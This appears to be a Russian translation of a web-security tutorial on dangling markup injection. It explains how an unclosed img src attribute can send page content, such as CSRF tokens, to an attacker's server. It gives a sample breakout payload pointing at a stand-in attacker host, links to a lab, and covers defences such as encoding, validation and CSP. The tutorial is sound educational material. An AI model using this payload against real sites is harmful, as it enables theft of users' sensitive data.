Висячая инъекция разметки
В этом разделе мы объясним, как происходит внедрение висячей разметки, как работает типичный эксплойт и как предотвратить атаки с использованием висячей разметки.

Что такое внедрение висячей разметки?
Внедрение висячей разметки — это метод захвата данных между доменами в ситуациях, когда полноценная атака с использованием межсайтового скриптинга невозможна.

Как предотвратить атаки с использованием висячей разметки
Вы можете предотвратить атаки с использованием висячей разметки, используя те же общие меры защиты, которые применяются для предотвращения межсайтового скриптинга , путем кодирования выходных данных и проверки входных данных по прибытии.

Предположим, что приложение небезопасным способом внедряет в свои ответы данные, контролируемые злоумышленником:

<input type="text" name="input" value="CONTROLLABLE DATA HERE
Предположим также, что приложение не фильтрует и не экранирует символы >или ". Злоумышленник может использовать следующий синтаксис, чтобы выйти из кавычек значения атрибута и окружающего тега и вернуться в контекст HTML:

">
В этой ситуации злоумышленник, естественно, попытается выполнить XSS. Но предположим, что обычная атака XSS невозможна из-за входных фильтров, политики безопасности контента или других препятствий. Здесь все еще может быть возможно осуществить атаку с внедрением висячей разметки, используя полезную нагрузку, подобную следующей:

"><img src='//attacker-website.com?
Эта полезная нагрузка создает imgтег и определяет начало атрибута, srcсодержащего URL на сервере злоумышленника. Обратите внимание, что полезная нагрузка злоумышленника не закрывает атрибут src, который остается "висящим". Когда браузер анализирует ответ, он будет смотреть вперед, пока не встретит одинарную кавычку, чтобы завершить атрибут. Все до этого символа будет рассматриваться как часть URL и будет отправлено на сервер злоумышленника в строке запроса URL. Любые не буквенно-цифровые символы, включая переносы строк, будут закодированы в URL.

Последствием атаки является то, что злоумышленник может перехватить часть ответа приложения после точки инъекции, которая может содержать конфиденциальные данные. В зависимости от функциональности приложения это могут быть токены CSRF, сообщения электронной почты или финансовые данные.

Любой атрибут, который делает внешний запрос, может быть использован для висячей разметки.

Эту следующую лабораторную работу сложно решить, поскольку все внешние запросы заблокированы. Однако есть определенные теги, которые позволяют вам хранить данные и извлекать их с внешнего сервера позже. Решение этой лабораторной работы может потребовать взаимодействия с пользователем.

[![Open Lab](https://img.shields.io/badge/Open-Lab-blue)](01.%20%28Эксперт%29%20Отраженный%20XSS-удар,%20защищенный%20очень%20строгим%20CSP,%20с%20атакой%20на%20висячую%20разметку.md)

Вы также можете смягчить некоторые атаки с использованием висячей разметки, используя политику безопасности контента (CSP). Например, вы можете предотвратить некоторые (но не все) атаки, используя политику, которая запрещает тегам, например, imgзагружать внешние ресурсы.

Примечание
Браузер Chrome решил бороться с атаками на висячую разметку, предотвращая imgопределение тегами URL-адресов, содержащих необработанные символы, такие как угловые скобки и символы новой строки. Это предотвратит атаки, поскольку данные, которые в противном случае были бы захвачены, как правило, будут содержать эти необработанные символы, поэтому атака блокируется.
